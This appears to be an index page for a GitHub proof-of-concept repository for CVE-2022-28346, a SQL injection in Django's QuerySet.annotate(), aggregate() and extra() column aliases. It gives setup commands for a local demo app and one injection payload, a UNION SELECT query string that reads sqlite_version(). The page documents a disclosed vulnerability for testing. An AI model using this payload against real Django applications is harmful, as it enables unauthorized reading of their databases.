# CVE-2022-28346

An issue was discovered in Django 2.2 before 2.2.28, 3.2 before 3.2.13, and 4.0 before 4.0.4. QuerySet.annotate(), aggregate(), and extra() methods are subject to SQL injection in column aliases via a crafted dictionary (with dictionary expansion) as the passed **kwargs.

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/vincentinttsh](https://github.com/vincentinttsh) |
| Url      | [https://github.com/vincentinttsh/CVE-2022-28346](https://github.com/vincentinttsh/CVE-2022-28346)                                               |
| Stars    | 0                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

<h1 align="center">CVE-2022-28346 PoC <a href="https://twitter.com/intent/tweet?text=CVE-2022-28346 PoC : https://github.com/ahsentekdemir/CVE-2022-28346"><img src="https://img.shields.io/badge/Tweet--lightgrey?logo=twitter&style=social" alt="Tweet" height="20"/></a></h1>


### Impact:
- Potential SQL injection in QuerySet.annotate(), aggregate(), and extra().





## Installation 
```
poetry install
python manage.py makemigrations
python manage.py migrate
python manage.py loaddata data.json
python manage.py runserver
```

## PoC
```
?field=poc.title" FROM "poc_blog" union SELECT "-1,",sqlite_version(),"3" --
```
![poc-image](./poc.png)

## References
[CVE Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-28346)

[Django](https://www.djangoproject.com/weblog/2022/apr/11/security-releases/)




## Get the content

```
git clone https://github.com/vincentinttsh/CVE-2022-28346
cd CVE-2022-28346
```

{% embed url="https://github.com/vincentinttsh/CVE-2022-28346" %}

<figure><img src="https://avatars.githubusercontent.com/u/14941597?v=4" alt=""><figcaption><p>vincentinttsh</p></figcaption></figure>
